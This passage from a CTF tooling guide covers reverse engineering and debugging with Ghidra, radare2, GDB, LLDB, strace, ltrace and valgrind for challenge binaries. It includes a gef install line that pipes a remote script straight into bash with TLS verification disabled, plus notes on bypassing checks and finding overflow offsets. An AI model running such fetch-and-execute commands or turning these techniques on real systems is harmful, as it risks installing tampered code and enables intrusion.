3. **Auto-Analysis**: Analyze → Auto Analyze (check all relevant options)
    - Decompiler Parameter ID
    - Function Start Search
    - Stack analysis

### Key Windows

|Window|Purpose|
|---|---|
|**Listing**|Disassembly view|
|**Decompiler**|C pseudocode|
|**Symbol Tree**|Functions, imports, exports|
|**Data Type Manager**|Structures, types|
|**Script Manager**|Run Python/Java scripts|

### Essential Shortcuts

|Shortcut|Action|
|---|---|
|`L`|Rename label|
|`Ctrl+Shift+E`|Edit function signature|
|`Ctrl+L`|Retype variable|
|`;`|Set comment|
|`G`|Go to address|
|`Ctrl+Shift+G`|Find references to|
|`Ctrl+F`|Search program text|
|`Alt+Left/Right`|Navigate back/forward|

### CTF Techniques

**Finding main() in Stripped Binaries**:

```
1. Navigate to entry point (typically _start)
2. Follow call to __libc_start_main
3. First argument (RDI in x64) points to main()
```

**Analyzing Structures**:

- Window → Data Type Manager
- Right-click → New → Structure
- Define members with offsets matching disassembly

**Scripting (Python)**:

```python
# Example: Decrypt XOR-encoded strings
from ghidra.program.model.data import *

currentProgram.getListing()
# Access memory, patch bytes, automate analysis
```

**Collaborative Analysis**:

- Ghidra Server allows shared projects
- Version control for reversing large binaries

### Decompiler Comparison

|Feature|Ghidra|Hex-Rays|
|---|---|---|
|**Cost**|Free|~$2,500|
|**Accuracy**|[Unverified] Generally comparable, may differ on complex optimizations|Industry standard|
|**Speed**|Slower on large binaries|Faster|
|**Customization**|Open-source, extensible|Limited|

---

## Radare2 – Command-Line Framework

**Purpose**: Scriptable, portable reverse engineering framework emphasizing automation and CLI workflows.

### Installation

```bash
# Kali Linux
sudo apt install radare2

# Build from source (latest features)
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh
```

### Core Commands

```bash
# Open binary in write mode
r2 -w binary

# Analyze all
aaa

# List functions
afl

# Print disassembly of function
pdf @main

# Seek to address
s 0x401000

# Print hex dump
px 64

# Search for strings
iz

# Cross-references
axt @address

# Visual mode
V
```

### CTF Workflow

**Basic Analysis**:

```bash
r2 binary
[0x00400000]> aaa           # Analyze all
[0x00400000]> afl           # List functions
[0x00400000]> s main        # Seek to main
[0x00400000]> pdf           # Print disassembly
```

**String Extraction**:

```bash
[0x00400000]> iz            # Strings in data sections
[0x00400000]> izz           # All strings in binary
```

**Patching**:

```bash
[0x00400000]> s 0x401050    # Seek to target
[0x00400000]> wx 90909090   # Write NOP bytes
[0x00400000]> q             # Quit (auto-saves in -w mode)
```

**Debugging Integration**:

```bash
r2 -d binary               # Debug mode
[0x00400000]> db 0x401000  # Set breakpoint
[0x00400000]> dc           # Continue execution
[0x00400000]> dr           # Display registers
```

### Visual Mode (`V`)

- **Graph Mode**: `VV` → function graph
- **Cursor Mode**: `p` cycles through views (hex, disasm, debug)
- **Edit**: Insert mode to patch bytes directly

### R2Pipe (Scripting)

```python
import r2pipe

r2 = r2pipe.open("binary")
r2.cmd("aaa")
functions = r2.cmdj("aflj")  # JSON output
print([f['name'] for f in functions])
```

### Limitations

- Steep learning curve
- [Unverified] Decompiler (r2dec/r2ghidra plugins) less mature than Ghidra/IDA
- CLI-centric (Cutter GUI exists but less feature-complete)

---

## Decompiler Deep Dive

### Ghidra Decompiler

**Automatic Features**:

- Type propagation from library function signatures
- Stack variable identification
- Control flow structuring (if/else, loops)

**Manual Improvements**:

```c
// Right-click variable → Retype
// Change from undefined4 to:
int user_input;

// Edit function signature (Ctrl+Shift+E)
void process_data(char *buffer, int length);
```

**Handling Obfuscation**:

- Opaque predicates: Manually simplify always-true conditions
- Fake control flow: Ignore unreachable paths
- [Inference] Complex obfuscation may require manual assembly analysis

### Hex-Rays Decompiler (IDA)

**Optimization Detection**:

- Recognizes compiler patterns (GCC, MSVC, Clang)
- [Unverified] Better at handling inlined functions than Ghidra

**Limitations**:

- Cannot decompile anti-disassembly tricks (e.g., overlapping instructions)
- Custom calling conventions require manual annotation

---

## Tool Selection Matrix

|Scenario|Recommended Tool|
|---|---|
|Quick ELF header inspection|`readelf`|
|Linux binary with symbols|Ghidra|
|Stripped Windows PE|IDA Pro (if available)|
|Large-scale automation|Radare2 + scripting|
|Collaborative team analysis|Ghidra Server|
|Embedded/IoT firmware|Ghidra (better architecture support)|
|Malware with packing|IDA Pro + manual unpacking|

---

## Important Related Topics

- **Dynamic Analysis**: GDB, PEDA, pwndbg (complements static analysis)
- **Binary Patching**: Techniques for modifying executables to bypass checks
- **Obfuscation Techniques**: Control flow flattening, opaque predicates, packing
- **Scripting**: IDAPython, Ghidra Python, R2Pipe for automation
- **Debugging Symbols**: Leveraging DWARF/PDB files when available
- **Anti-Reversing Techniques**: Detection and bypass strategies

---

# Dynamic Analysis Tools

## GDB (GNU Debugger)

GDB is the primary debugger for Linux-based CTF challenges. It provides low-level control over program execution, enabling real-time observation of memory, registers, and control flow.

### Core GDB Concepts and Startup

Starting GDB:

```bash
gdb <binary>
gdb --args <binary> <arg1> <arg2>     # Pass arguments to binary
gdb --pid <pid>                        # Attach to running process
gdb -x <script.gdb>                    # Execute GDB script on startup
```

Core workflow: Set breakpoints at critical locations, run the program, inspect state at breakpoints, step through instructions, modify memory/registers, and continue execution.

### Breakpoints

Breakpoints halt execution at specified locations, enabling inspection of state.

Setting breakpoints:

```
(gdb) break main                       # Break at function entry
(gdb) break *0x08048000                # Break at address
(gdb) break <filename>:<line>          # Break at source line
(gdb) break function if <condition>    # Conditional breakpoint
```

Conditional breakpoints are invaluable for bypassing loops or focusing on specific iterations. Example: `break malloc if size > 1000` only breaks when malloc is called with size exceeding 1000.

Breakpoint management:

```
(gdb) info breakpoints                 # List all breakpoints
(gdb) disable <bp_num>                 # Disable breakpoint
(gdb) enable <bp_num>                  # Re-enable breakpoint
(gdb) delete <bp_num>                  # Delete breakpoint
(gdb) clear <location>                 # Clear breakpoint at location
```

Hardware breakpoints (available on most architectures) don't require code modification:

```
(gdb) hbreak <location>                # Hardware breakpoint (typically 4 per CPU)
```

Watch breakpoints trigger when memory is accessed or modified:

```
(gdb) watch <variable>                 # Break on write to variable
(gdb) awatch <variable>                # Break on read or write
(gdb) rwatch <variable>                # Break on read only
```

Watch breakpoints are essential for detecting memory corruption. In a buffer overflow CTF challenge, `watch buffer[64]` halts execution when the overflow writes past the buffer boundary.

### Execution Control

Basic execution commands:

```
(gdb) run                              # Start/restart program
(gdb) continue                         # Resume execution
(gdb) step                             # Step into next instruction (follows function calls)
(gdb) next                             # Step over next instruction (skips function calls)
(gdb) nexti                            # Step over next assembly instruction
(gdb) stepi                            # Step into next assembly instruction
(gdb) finish                           # Execute until return from current function
(gdb) until <location>                 # Execute until specified location
(gdb) jump <location>                  # Jump to location without executing intermediate code
```

Step vs. next distinction is critical: `step` descends into function calls (useful for understanding function behavior), while `next` treats function calls as atomic (useful for skipping library functions).

Reverse execution (requires GDB compiled with reverse debugging support, available in newer versions):

```
(gdb) reverse-continue                 # Continue in reverse
(gdb) reverse-step                     # Step backward
(gdb) reverse-next                     # Next backward
```

Reverse execution is particularly useful when a crash occurs; stepping backward from the crash point reveals the exact state that led to the failure.

### Register Inspection and Modification

Viewing registers:

```
(gdb) info registers                   # Display all general-purpose registers
(gdb) info registers rax rdi           # Display specific registers (x64)
(gdb) info registers eax edi           # Display specific registers (x86)
(gdb) p $rax                           # Print RAX value (x64)
(gdb) p $eax                           # Print EAX value (x86)
(gdb) p/x $rax                         # Print in hexadecimal
(gdb) p/t $rax                         # Print in binary
(gdb) p/d $rax                         # Print in decimal
```

Viewing special registers:

```
(gdb) info registers rip               # Instruction pointer (x64)
(gdb) info registers rsp               # Stack pointer (x64)
(gdb) info registers rbp               # Base pointer (x64)
(gdb) info registers eflags            # CPU flags
```

Modifying registers:

```
(gdb) set $rax = 0x1234                # Set RAX to hex value
(gdb) set $rdi = 0x7fffffff            # Set RDI to max 32-bit signed int
(gdb) set $rsp = $rsp - 0x100          # Adjust stack pointer
```

Register modification is powerful in CTF challenges. If a program checks `if (rax != expected_value)`, modifying `rax` at that point bypasses the check entirely.

### Memory Inspection

Examining memory:

```
(gdb) x <address>                      # Examine memory at address
(gdb) x/x <address>                    # Hexadecimal format
(gdb) x/s <address>                    # String format (null-terminated)
(gdb) x/i <address>                    # Instruction/disassembly format
(gdb) x/d <address>                    # Decimal format
(gdb) x/10x <address>                  # Display 10 values in hex
(gdb) x/20i $rip                       # Display 20 instructions from current RIP
(gdb) x/100s <address>                 # Display 100 strings starting at address
```

Memory size specifications (count):

```
(gdb) x/16x $rsp                       # 16 hexadecimal values (64 bytes on 64-bit)
(gdb) x/256b 0x7fffffff000             # 256 bytes (1 byte each)
(gdb) x/32i $rip                       # 32 instructions
```

Examining regions:

```
(gdb) info proc mapping                # Display memory regions and permissions
(gdb) dump memory <file> <start> <end> # Dump memory region to file
(gdb) restore <file> <address>         # Restore memory from file
```

Modifying memory:

```
(gdb) set {int}0x7ffffffde800 = 0x41   # Set 32-bit value at address
(gdb) set {char}0x7ffffffde800 = 'A'   # Set single byte
(gdb) set {long long}0x7ffffffde800 = 0x4141414141414141  # Set 64-bit value
```

Memory modification is essential for patching binaries during debugging or triggering alternate code paths. Overwriting a return address on the stack allows jumping to arbitrary code.

### Disassembly

Viewing assembly code:

```
(gdb) disassemble main                 # Disassemble entire function
(gdb) disassemble <address>            # Disassemble at address
(gdb) disassemble /m <function>        # Disassemble with source lines interleaved
(gdb) disassemble <start>, <end>       # Disassemble address range
```

Syntax control:

```
(gdb) set disassembly-flavor intel     # Use Intel syntax (default on some systems)
(gdb) set disassembly-flavor att       # Use AT&T syntax
```

Continuous disassembly while stepping:

```
(gdb) tui enable                       # Enable Text User Interface (TUI)
(gdb) layout asm                       # Show assembly in TUI
(gdb) layout src                       # Show source code in TUI (if debug symbols present)
(gdb) layout reg                       # Show registers
(gdb) layout split                     # Show assembly and source simultaneously
```

The TUI mode is invaluable for interactive debugging, providing real-time views of code, registers, and memory.

### Backtrace and Stack Inspection

Understanding call stack:

```
(gdb) backtrace                        # Show function call stack
(gdb) backtrace full                   # Show stack with local variables
(gdb) frame 0                          # Select frame 0 (current function)
(gdb) frame 2                          # Select frame 2 (caller's caller)
(gdb) info frame                       # Display details of current frame
(gdb) info locals                      # Display local variables in current frame
(gdb) info args                        # Display arguments to current function
```

Stack inspection reveals the execution path leading to the current point. This is critical when debugging crashes or understanding recursive functions in CTF challenges.

### GDB Python API

GDB supports Python scripting for automated analysis:

```python
# Save as script.py
import gdb

class BreakpointLogger(gdb.Breakpoint):
    def stop(self):
        frame = gdb.selected_frame()
        print(f"Breakpoint hit at {frame.name()}")
        print(f"RIP: {frame.read_register('rip')}")
        return False  # Don't halt execution

# Create the breakpoint
BreakpointLogger("main")
```

Run with:

```bash
gdb -x script.py <binary>
```

Or within GDB:

```
(gdb) python
import gdb
gdb.execute("break main")
gdb.execute("run")
end
```

Advanced scripting for CTF:

```python
import gdb

def get_all_registers():
    """Retrieve all general-purpose registers"""
    registers = {}
    for reg in ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp']:
        try:
            registers[reg] = int(gdb.parse_and_eval(f"${reg}"))
        except:
            pass
    return registers

def print_stack(count=10):
    """Print stack contents"""
    rsp = int(gdb.parse_and_eval("$rsp"))
    for i in range(count):
        addr = rsp + (i * 8)
        value = int(gdb.parse_and_eval(f"*(long long*){addr}"))
        print(f"[RSP+{i*8:2d}] 0x{addr:x}: 0x{value:016x}")

print_stack(20)
```

### Debugging Stripped Binaries

Stripped binaries lack symbol information, complicating debugging:

```
(gdb) file <binary>                    # Load binary without running
(gdb) add-symbol-file <binary> <base>  # Add symbol file at base address
```

If source symbols are available in a separate file:

```bash
objcopy --add-gnu-debuglink=<binary>.debug <binary>
gdb <binary>
```

For stripped binaries, analyze using addresses and disassembly rather than function names. Identify function entries by looking for function prologue patterns.

### GDB Configuration

Essential ~/.gdbinit configurations:

```
# ~/.gdbinit
set disassembly-flavor intel
set pagination off
set print pretty on
set print array on
set print array-indexes on
set print union on
set history save on
set history size 10000

# Display registers on every breakpoint
define hook-stop
    info registers
end

# Custom command to dump stack
define dump_stack
    x/20gx $rsp
end
```

Load custom GDB scripts/plugins like pwndbg (exploitation-focused) or gef (reverse engineering-focused):

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Install gef
bash -c "$(curl -fsSLk https://gef.blinkenbrose.com/sh)"
```

Both enhance GDB with exploitation-focused commands like `aslr` (check ASLR status), `vmmap` (display memory regions), `heap` (analyze heap), and `rop` (find ROP gadgets).

### Debugging Multi-threaded Programs

Debugging threaded programs:

```
(gdb) info threads                     # List all threads
(gdb) thread 1                         # Switch to thread 1
(gdb) break <location> thread 2        # Breakpoint only on thread 2
(gdb) continue                         # Continue all threads
(gdb) thread apply all backtrace       # Show stack trace for all threads
```

Thread synchronization bugs (race conditions, deadlocks) are common CTF challenges. Using `info threads` and conditional breakpoints identifies which thread triggers vulnerable behavior.

---

## LLDB (LLVM Debugger)

LLDB is the native debugger on macOS and iOS, increasingly used on Linux. It provides functionality similar to GDB but with modern architecture and better support for modern languages.

### LLDB Startup and Basic Commands

Starting LLDB:

```bash
lldb <binary>
lldb -- <binary> <arg1> <arg2>         # Pass arguments
lldb -p <pid>                          # Attach to running process
lldb -s <script.lldb>                  # Execute script on startup
```

Core workflow mirrors GDB: set breakpoints, run, inspect state, step, and continue.

### Breakpoints in LLDB

Setting breakpoints:

```
(lldb) breakpoint set --name main                        # Break at function
(lldb) b main                                             # Shorthand
(lldb) breakpoint set --address 0x100001234              # Break at address
(lldb) b -a 0x100001234                                  # Shorthand
(lldb) breakpoint set --file main.c --line 42            # Break at source line
(lldb) b main.c:42                                        # Shorthand
(lldb) breakpoint set --name malloc --condition "size > 1000"  # Conditional
```

Breakpoint management:

```
(lldb) breakpoint list                                    # List breakpoints
(lldb) breakpoint disable 1                               # Disable breakpoint 1
(lldb) breakpoint delete 1                                # Delete breakpoint 1
```

Watchpoints in LLDB:

```
(lldb) watchpoint set variable buffer                     # Watch variable
(lldb) watchpoint set expression -- <address> -s 8       # Watch address for 8 bytes
(lldb) watchpoint list                                    # List watchpoints
```

### Execution Control in LLDB

Basic commands:

```
(lldb) run                             # Start program
(lldb) continue                        # Resume execution
(lldb) step                            # Step into next instruction (follow calls)
(lldb) next                            # Step over next instruction
(lldb) instruction-step                # Step assembly instruction
(lldb) instruction-step-over           # Step over assembly instruction
(lldb) finish                          # Execute until return
(lldb) thread until <location>         # Execute until location
(lldb) process continue                # Resume all threads
```

### Register and Memory Inspection in LLDB

Viewing registers:

```
(lldb) register read                   # Show all registers
(lldb) register read rax               # Show specific register
(lldb) register read --format x rax    # Show in hex
(lldb) register read --format f xmm0   # Show XMM register as float
```

Modifying registers:

```
(lldb) register write rax 0x1234       # Set RAX
(lldb) register write rsp $rsp-0x100   # Adjust RSP
```

Memory inspection:

```
(lldb) memory read 0x7fffffff000       # Display memory
(lldb) memory read -f x -c 16 0x7fffffff000  # 16 hex values
(lldb) memory read -f s 0x7fffffff000  # Null-terminated string
(lldb) memory read -f i -c 20 $rip     # 20 instructions from RIP
```

Memory modification:

```
(lldb) memory write 0x7fffffff000 0x41414141  # Write 4 bytes
```

### Disassembly in LLDB

Disassembly commands:

```
(lldb) disassemble --name main         # Disassemble function
(lldb) disassemble -a 0x100001234      # Disassemble at address
(lldb) disassemble -c 20               # Disassemble 20 instructions
(lldb) disassemble --mixed             # Interleave source code
```

### Backtrace and Stack in LLDB

Stack inspection:

```
(lldb) bt                              # Show backtrace
(lldb) bt all                          # Backtrace for all threads
(lldb) frame select 0                  # Select frame 0
(lldb) frame info                      # Display frame details
(lldb) frame variable                  # Show local variables
```

### LLDB Python API

LLDB supports Python scripting:

```python
# Save as script.py
import lldb

def my_command(debugger, command, result, internal_dict):
    target = debugger.GetSelectedTarget()
    process = target.GetProcess()
    thread = process.GetThreadAtIndex(0)
    frame = thread.GetFrameAtIndex(0)
    
    rax = frame.FindRegister("rax")
    print(f"RAX: 0x{rax.GetValueAsUnsigned():x}")

# Register the command
def __lldb_init_module(debugger, internal_dict):
    debugger.HandleCommand("command script add -f script.my_command mycommand")
```

### LLDB vs GDB

Key differences:

GDB: More mature, standard on Linux, extensive documentation, gdb-specific plugins (gef, pwndbg).

LLDB: Native on macOS, better C++ debugging, modern codebase, Python API, faster in some scenarios.

For CTF challenges, GDB is more common on Linux systems. LLDB is essential for macOS/iOS-based challenges and increasingly available on Linux.

---

## strace (System Call Tracing)

strace intercepts and logs system calls and signals, providing insight into program behavior without binary modification or debugging symbols.

### Basic strace Usage

Starting strace:

```bash
strace <binary>                        # Trace all system calls
strace -p <pid>                        # Attach to running process
strace -e open,read,write <binary>     # Trace specific system calls
strace -o <output.txt> <binary>        # Redirect output to file
```

Output interpretation:

Each line shows a system call with arguments and return value:

```
open("/etc/passwd", O_RDONLY) = 3
read(3, "root:x:0:0:...", 1024) = 512
close(3) = 0
```

The number after the call name indicates the file descriptor or return value.

### Filtering System Calls

Tracing specific calls:

```bash
strace -e trace=file <binary>          # Trace file-related calls (open, stat, etc.)
strace -e trace=process <binary>       # Trace process calls (fork, exec, etc.)
strace -e trace=network <binary>       # Trace network calls (socket, connect, etc.)
strace -e trace=signal <binary>        # Trace signal handling
strace -e trace=ipc <binary>           # Trace inter-process communication
strace -e open,read,write,close <binary>  # Trace specific calls
```

### Timing and Performance Analysis

Timing system calls:

```bash
strace -c <binary>                     # Summary of system call counts and time
strace -t <binary>                     # Print timestamp before each call
strace -T <binary>                     # Print execution time for each call
strace -tt <binary>                    # Print microsecond-precise timestamp
```

Output example with `-c`:

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 40.32    0.042531      212591         2           write
 35.79    0.037643       47000         1           execve
 20.21    0.021248           0     57193           brk
  2.34    0.002460           0      4200           mmap2
  ...
```

This identifies performance bottlenecks. Excessive system calls or high time consumption reveals where to focus optimization or exploitation efforts.

### Argument Details and Signal Tracing

Detailed argument output:

```bash
strace -v <binary>                     # Verbose output (print full structures)
strace -x <binary>                     # Print arguments in hex
strace -xx <binary>                    # Print strings in hex
```

Signal tracing:

```bash
strace -e signal=all <binary>          # Trace all signals
strace -e signal=SIGSEGV,SIGTERM <binary>  # Trace specific signals
```

### Environmental and String Inspection

Showing environment variables:

```bash
strace -e execve <binary>              # Show execve calls (which reveal env)
```

String extraction:

```bash
strace -s 256 <binary>                 # Print up to 256 characters of strings (default 32)
```

### Multi-process and Multi-threaded Tracing

Tracing child processes:

```bash
strace -f <binary>                     # Follow fork calls
strace -F <binary>                     # Follow fork and vfork calls
```

Each child process is traced separately with output prefixed by PID.

Tracing threads:

```bash
strace -f -p <pid>                     # Follow threads of running process
```

### Practical CTF Applications

Identifying input validation:

```bash
strace -e open,read <binary>
```

Reveals file operations. CTF challenges often read input files; tracking these operations reveals file handling logic and potential paths for input manipulation.

Detecting hardcoded paths or environment dependencies:

```bash
strace -e open,stat <binary> 2>&1 | grep -E "\.conf|\.txt|\.key"
```

Identifies configuration files or keys accessed by the binary. This reveals external dependencies or potential sources of flags.

Discovering hidden executable or library loading:

```bash
strace -e open,execve <binary>
```

Shows dynamically loaded libraries or executed binaries. Some CTF challenges use LD_PRELOAD or runtime linking to load malicious code.

Observing memory-related calls:

```bash
strace -e mmap,brk,mprotect <binary>
```

Tracks memory allocation and protection changes. Changing memory to executable (mprotect with PROT_EXEC) often indicates code injection or ROP payload execution.

Detecting network communication:

```bash
strace -e socket,connect,send,recv <binary>
```

Identifies network-based communication. Some CTF challenges involve connecting to remote servers or exfiltrating data.

### Output Analysis

Combining strace with other tools:

```bash
strace -o trace.txt <binary>
grep -E "flag|password|secret" trace.txt  # Search for sensitive patterns
```

Parsing strace output programmatically:

```bash
strace <binary> 2>&1 | grep "^open" | awk '{print $2}' | sort | uniq
```

Extracts all opened files.

### strace Limitations

strace operates at the system call level, missing user-space behavior not visible to the kernel. Memory corruption or logic errors within a single function are not directly observable. For finer-grained analysis, use GDB or custom instrumentation. Additionally, strace adds significant overhead, potentially changing timing-sensitive behavior (useful for detecting timing-based side-channel vulnerabilities but problematic for real-time systems).

---

## Integrated Debugging Workflows

### Combining Tools for Comprehensive Analysis

A robust CTF approach combines multiple tools:

1. **Static analysis first**: Use objdump, readelf, or Ghidra to understand binary structure and identify interesting functions.
    
2. **Trace system calls**: Run strace to observe external dependencies and file operations.
    
3. **Dynamic debugging**: Use GDB/LLDB to inspect state at critical points, verify assumptions, and test exploits.
    
4. **Memory analysis**: Combine memory inspection commands with watch breakpoints to detect corruption.
    

Example workflow for a buffer overflow challenge:

```bash
# 1. Identify vulnerable function
objdump -d <binary> | grep -A20 "strcpy"

# 2. Trace file operations
strace -e open,read <binary> input.txt

# 3. Debug with breakpoint at vulnerable function
gdb --args <binary> input.txt
(gdb) break vulnerable_function
(gdb) run
(gdb) disassemble
(gdb) set $rsp = 0x... ; jump to overwritten return address
```

### Automating Exploitation

Leverage GDB scripting to automate exploit testing:

```python
# exploit_test.py
import gdb
import subprocess
import sys

def test_payload(payload):
    """Test a payload against the target"""
    # Create payload file
    with open('payload.bin', 'wb') as f:
        f.write(payload)
    
    # Run GDB script
    script = f"""
    file {sys.argv[1]}
    break main
    run < payload.bin
    continue
    """
    
    result = subprocess.run(['gdb', '-x', '-'], input=script.encode(), capture_output=True)
    return result.stdout.decode()

# Test incrementally increasing payload sizes
for size in range(64, 256, 8):
    payload = b'A' * size
    output = test_payload(payload)
    if 'Segmentation fault' in output:
        print(f"Crash at size {size}")
        break
```

This automated approach quickly identifies crash points for buffer overflow exploitation.

## ltrace – Library Call Tracing

**Purpose**: Intercepts and logs library function calls made by a process at runtime. Reveals dynamic behavior, parameter values, and return values without requiring source code or disassembly interpretation.

**Core Syntax**

```bash
ltrace [options] <binary> [arguments]
```

**Essential Flags for CTF Exploitation**

`-e <function>` – Trace specific functions

```bash
ltrace -e printf ./binary arg1 arg2
```

Monitors only named function calls. Use to focus on vulnerable functions (strcpy, sprintf, gets).

`-e <library>@<libc>` – Trace entire library

```bash
ltrace -e libc.so.6 ./binary
```

[Inference] Traces all calls to specified library. Useful for identifying all libc interactions without output flooding.

`-c` – Call count summary

```bash
ltrace -c ./binary
```

Shows count of each function call and total time spent. Reveals which functions dominate execution; useful for identifying loops or frequently-called vulnerable functions.

`-C` – Demangle C++ symbols

```bash
ltrace -C ./binary
```

Converts mangled C++ function names. Essential for C++ binaries where function identification requires demangling.

`-o <file>` – Output to file

```bash
ltrace -o trace.txt ./binary arg1
```

Redirects trace output to file for post-analysis or comparison across multiple runs.

`-s <length>` – String argument length

```bash
ltrace -s 256 ./binary
```

Specifies maximum characters printed for string arguments. Default often truncates; increase for capturing full payloads or buffer contents.

`-p <pid>` – Attach to running process

```bash
ltrace -p 1234
```

Traces library calls of already-running process. Useful for long-running services or when initial execution doesn't trigger vulnerable code.

**Advanced Parameter Capture**

Trace specific function with full arguments:

```bash
ltrace -e "strcpy" -s 512 ./binary
```

Captures full buffer copy operations; identifies source and destination addresses indirectly through argument inspection.

Monitor memory allocation patterns:

```bash
ltrace -e "malloc@libc,free@libc" ./binary
```

[Inference] Traces heap allocation/deallocation; useful for heap exploitation research, identifying use-after-free patterns or heap spraying opportunities.

Capture format string arguments:

```bash
ltrace -e "printf@libc" -s 256 ./binary
```

Monitors printf family calls; reveals format strings passed at runtime, confirming format string vulnerability presence.

**Practical CTF Exploitation Workflow**

Identify buffer overflow source:

```bash
ltrace -e "read@libc,fgets@libc" -s 512 ./binary < payload.txt
```

Traces input functions; shows exactly how untrusted data enters the binary and what size is read.

Track strcpy usage:

```bash
ltrace -e "strcpy@libc" -s 1024 ./binary
```

Shows all string copy operations. [Inference] Unsafe operations without bounds checking directly indicate overflow points.

Monitor system calls alongside library calls:

```bash
ltrace -S ./binary
```

Includes system call tracing (strace-like output). Shows interactions between library calls and kernel.

**Linux-Specific Considerations**

ltrace uses `/etc/ld.so.conf` and library paths to locate target libraries. On stripped binaries, ltrace still intercepts at PLT level, making it effective even when symbols unavailable. Library name resolution depends on `LD_LIBRARY_PATH` environment variable; manipulating this can redirect to custom libc implementations for deeper analysis.

**Common Limitations**

ltrace may not capture:

- Direct system calls (use strace instead)
- Inlined functions (not library calls)
- Calls through function pointers where resolution occurs at runtime

---

## valgrind – Memory Debugging

**Purpose**: Instruments binary execution to detect memory errors including buffer overflows, use-after-free, memory leaks, and uninitialized variable access. Provides detailed reports with precise locations and call stacks.

**Core Syntax**

```bash
valgrind [options] ./binary [arguments]
```

**Essential Tools Within Valgrind Suite**

**Memcheck (default)**

```bash
valgrind ./binary
```

Primary memory error detector. Tracks all memory allocations and accesses; identifies invalid reads/writes and heap corruption.

**Helgrind** – Thread error detection

```bash
valgrind --tool=helgrind ./binary
```

Detects race conditions and synchronization errors in multithreaded binaries. [Inference] Useful for identifying concurrency-based vulnerabilities in CTF challenges.

**Massif** – Heap profiler

```bash
valgrind --tool=massif ./binary
```

Profiles heap memory usage over time. Reveals memory allocation patterns; [Inference] useful for identifying heap spray opportunities or memory exhaustion attacks.

**Critical Memcheck Flags**

`--leak-check=full` – Comprehensive leak detection

```bash
valgrind --leak-check=full ./binary
```

Reports all unreleased memory with full call stacks. Identifies information disclosure through leaked data or use-after-free conditions.

`--show-leak-kinds=all` – All leak categories

```bash
valgrind --leak-check=full --show-leak-kinds=all ./binary
```

Includes definite, indirect, and reachable leaks. More verbose than default; essential for thorough analysis.

`--track-origins=yes` – Track uninitialized values

```bash
valgrind --track-origins=yes ./binary
```

Shows source of uninitialized memory reads. [Inference] Useful for identifying information disclosure from uninitialized buffers.

`--suppressions=<file>` – Suppress known errors

```bash
valgrind --suppressions=/usr/lib/valgrind/default.supp ./binary
```

Filters false positives from system libraries; reduces noise in output for focused vulnerability analysis.

`--log-file=<file>` – Output to file

```bash
valgrind --log-file=valgrind_report.txt ./binary arg1
```

Writes complete report to file for systematic analysis and archiving.

**Detecting Exploitation-Relevant Errors**

Buffer overflow detection:

```bash
valgrind --leak-check=full ./binary <<< "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

Memcheck detects invalid writes beyond allocated buffer; reports exact location and size of overflow.

Use-after-free identification:

```bash
valgrind --track-origins=yes ./binary
```

Reports access to freed memory with call stack showing allocation and deallocation points. [Inference] Directly identifies use-after-free exploitation vectors.

Heap corruption detection:

```bash
valgrind --leak-check=full ./binary
```

Reports "Invalid free()" or heap consistency errors when metadata corrupted.

**Advanced Configuration**

Combine multiple detection capabilities:

```bash
valgrind --leak-check=full --track-origins=yes --show-leak-kinds=all --log-file=analysis.txt ./binary payload
```

Custom suppression file for binary-specific libraries:

```bash
# suppression_file.supp
{
   <suppress_name>
   Memcheck:Leak
   match-leak-kinds: reachable
   fun:malloc
   obj:/path/to/library.so
}
```

```bash
valgrind --suppressions=suppression_file.supp ./binary
```

**Valgrind Output Interpretation**

Example output:

```
==12345== Invalid write of size 4
==12345==    at 0x4005D0: vulnerable_function (binary.c:42)
==12345==    by 0x4005E8: main (binary.c:50)
==12345==  Address 0x52b2040 is 0 bytes inside a block of size 16 alloc'd
==12345==    at 0x4C2E80F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
```

- **Invalid write**: Out-of-bounds memory access
- Call stack shows exact function and line (if debug symbols present)
- **Address analysis**: Shows allocated region and overflow extent

**Linux-Specific Considerations**

Valgrind requires debug symbols for precise reporting; compile with `-g` flag. Works on both 32-bit and 64-bit architectures. ASLR may interfere with address consistency; disable with `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` for reproducible analysis.

---

## Debugger Workflows and Scripts

**Purpose**: Interactive runtime analysis using GDB (GNU Debugger) or similar tools. Enables step-by-step execution, register inspection, memory examination, and conditional breakpoint automation.

**Core GDB Invocation**

```bash
gdb ./binary
```

**Essential GDB Commands for Exploitation Analysis**

**Breakpoint Management**

Set breakpoint at function:

```bash
(gdb) break main
(gdb) break vulnerable_function
```

Set breakpoint at address:

```bash
(gdb) break *0x0000555555554680
```

[Inference] Useful when debug symbols unavailable; use objdump or Ghidra to identify target addresses.

Conditional breakpoint:

```bash
(gdb) break *0x0000555555554680 if $rax == 0x1337
```

Pauses execution only when condition met. Essential for catching exploitation points in loops or conditional code paths.

List all breakpoints:

```bash
(gdb) info breakpoints
```

Delete breakpoint:

```bash
(gdb) delete 1
(gdb) delete breakpoints
```

**Execution Control**

Run binary with arguments:

```bash
(gdb) run arg1 arg2 arg3
(gdb) run < input_file
(gdb) run <<< "PAYLOAD"
```

Step into function:

```bash
(gdb) step
(gdb) si (single instruction)
```

Step over function:

```bash
(gdb) next
(gdb) ni (next instruction)
```

Continue execution:

```bash
(gdb) continue
```

Run until current function returns:

```bash
(gdb) finish
```

**Memory and Register Inspection**

Print register values:

```bash
(gdb) info registers
(gdb) print $rax
(gdb) print $rsp
```

Print register in specific format:

```bash
(gdb) print /x $rbp
(gdb) print /d $rax
```

(x = hex, d = decimal, t = binary, o = octal)

Examine memory:

```bash
(gdb) x/64x $rsp
(gdb) x/16i $rip
(gdb) x/s 0x0000555555554000
```

(64x = 64 hex values, 16i = 16 instructions, s = string)

Print memory as string:

```bash
(gdb) print (char*)0x0000555555554000
```

Dump memory region to file:

```bash
(gdb) dump binary memory /tmp/dump.bin 0x0000555555554000 0x0000555555555000
```

**Stack Analysis**

Print stack trace:

```bash
(gdb) backtrace
(gdb) bt full
```

Shows call stack with local variable values.

Print function arguments:

```bash
(gdb) info args
(gdb) print $arg1
```

[Inference] On x86-64, arguments in $rdi, $rsi, $rdx, $rcx, $r8, $r9; on x86, stack-based.

**Exploitation-Focused Workflow**

Identify buffer overflow depth:

```bash
(gdb) run <<< $(python3 -c "print('A'*100)")
